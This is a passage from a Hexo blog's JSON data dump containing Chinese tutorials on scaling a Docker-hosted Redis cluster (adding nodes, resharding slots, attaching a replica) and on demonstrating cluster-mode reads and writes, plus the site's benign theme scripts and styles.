class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>192.168.1.42:6388 Slave主机的IP:端口</p>\n</li>\n<li><p>192.168.1.42:6387 Master主机的IP:端口</p>\n</li>\n<li><p>最后加要挂载的Master主机的节点ID</p>\n</li>\n</ul>\n<ol start=\"8\">\n<li>查看节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922</span><br><span class=\"line\">8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected</span><br><span class=\"line\">791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>新建两个容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name redis-node-7 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6387</span><br><span class=\"line\">docker run -d --name redis-node-8 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6388</span><br></pre></td></tr></table></figure>","more":"<ol start=\"2\">\n<li>进入7号容器（新建的容器）</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-7 bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>使7号容器加入集群</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br><span class=\"line\">&gt;&gt;&gt; Send CLUSTER MEET to node 192.168.1.42:6387 to make it <span class=\"built_in\">join</span> the cluster.</span><br><span class=\"line\">[OK] New node added correctly.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>查看集群的节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:8371</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 5462 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 0 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\"></span><br><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[0-5460] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[5461-10922] (5462 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots: (0 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[10923-16383] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。</p>\n<ol start=\"5\">\n<li>重新分配槽号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster reshard 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>后面接着的IP还是集群的领路人。</p>\n<p>执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。</p>\n<p>然后下面输入新加入的机器的节点ID。</p>\n<p>输入all，最后输入yes确认。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">How many slots <span class=\"keyword\">do</span> you want to move (from 1 to 16384)? 4096</span><br><span class=\"line\">What is the receiving node ID? 791172307abf9223425af595e661cec441951170</span><br><span class=\"line\">Please enter all the <span class=\"built_in\">source</span> node IDs.</span><br><span class=\"line\">  Type <span class=\"string\">&#x27;all&#x27;</span> to use all the nodes as <span class=\"built_in\">source</span> nodes <span class=\"keyword\">for</span> the <span class=\"built_in\">hash</span> slots.</span><br><span class=\"line\">  Type <span class=\"string\">&#x27;done&#x27;</span> once you entered all the <span class=\"built_in\">source</span> nodes IDs.</span><br><span class=\"line\">Source node <span class=\"comment\">#1: all</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>再次查看集群节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 4096 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\"></span><br><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。</p>\n<ol start=\"7\">\n<li>为新加入的Master主机添加Slave主机</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>192.168.1.42:6388 Slave主机的IP:端口</p>\n</li>\n<li><p>192.168.1.42:6387 Master主机的IP:端口</p>\n</li>\n<li><p>最后加要挂载的Master主机的节点ID</p>\n</li>\n</ul>\n<ol start=\"8\">\n<li>查看节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922</span><br><span class=\"line\">8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected</span><br><span class=\"line\">791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>"},{"title":"Redis集群数据读写演示","date":"2023-08-13T08:32:45.000Z","_content":"\n### 数据读写存储\n\n错误演示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> keys *\n(empty array)\n127.0.0.1:6381> set k1 v1\n(error) MOVED 12706 192.168.1.42:6383\n127.0.0.1:6381> set k2 v2\nOK\n127.0.0.1:6381> set k3 v3\nOK\n127.0.0.1:6381> set k4 v4\n(error) MOVED 8455 192.168.1.42:6382\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n可以发现使用`redis-cli -p 6381`命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。\n\n正确演示：\n\n```bash 折叠代码\n127.0.0.1:6381> exit\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> FLUSHALL\nOK\n127.0.0.1:6381> set k1 v1\n-> Redirected to slot [12706] located at 192.168.1.42:6383\nOK\n192.168.1.42:6383> set k4 v4\n-> Redirected to slot [8455] located at 192.168.1.42:6382\nOK\n192.168.1.42:6382> \n```\n\n退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。\n\n","source":"_posts/RedisDataIO.md","raw":"---\ntitle: Redis集群数据读写演示\ndate: 2023-08-13 16:32:45\ncategories: 技术\ntags:\n  - Docker \n  - Redis\n---\n\n### 数据读写存储\n\n错误演示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> keys *\n(empty array)\n127.0.0.1:6381> set k1 v1\n(error) MOVED 12706 192.168.1.42:6383\n127.0.0.1:6381> set k2 v2\nOK\n127.0.0.1:6381> set k3 v3\nOK\n127.0.0.1:6381> set k4 v4\n(error) MOVED 8455 192.168.1.42:6382\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n可以发现使用`redis-cli -p 6381`命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。\n\n正确演示：\n\n```bash 折叠代码\n127.0.0.1:6381> exit\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> FLUSHALL\nOK\n127.0.0.1:6381> set k1 v1\n-> Redirected to slot [12706] located at 192.168.1.42:6383\nOK\n192.168.1.42:6383> set k4 v4\n-> Redirected to slot [8455] located at 192.168.1.42:6382\nOK\n192.168.1.42:6382> \n```\n\n退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。\n\n","slug":"RedisDataIO","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ei003i7zj30hblcob3","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"数据读写存储\"><a href=\"#数据读写存储\" class=\"headerlink\" title=\"数据读写存储\"></a>数据读写存储</h3><p>错误演示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; keys *</span><br><span class=\"line\">(empty array)</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k1 v1</span><br><span class=\"line\">(error) MOVED 12706 192.168.1.42:6383</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k2 v2</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k3 v3</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k4 v4</span><br><span class=\"line\">(error) MOVED 8455 192.168.1.42:6382</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>可以发现使用<code>redis-cli -p 6381</code>命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。</p>\n<p>正确演示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; FLUSHALL</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k1 v1</span><br><span class=\"line\">-&gt; Redirected to slot [12706] located at 192.168.1.42:6383</span><br><span class=\"line\">OK</span><br><span class=\"line\">192.168.1.42:6383&gt; <span class=\"built_in\">set</span> k4 v4</span><br><span class=\"line\">-&gt; Redirected to slot [8455] located at 192.168.1.42:6382</span><br><span class=\"line\">OK</span><br><span class=\"line\">192.168.1.42:6382&gt; </span><br></pre></td></tr></table></figure>\n\n<p>退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"数据读写存储\"><a href=\"#数据读写存储\" class=\"headerlink\" title=\"数据读写存储\"></a>数据读写存储</h3><p>错误演示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 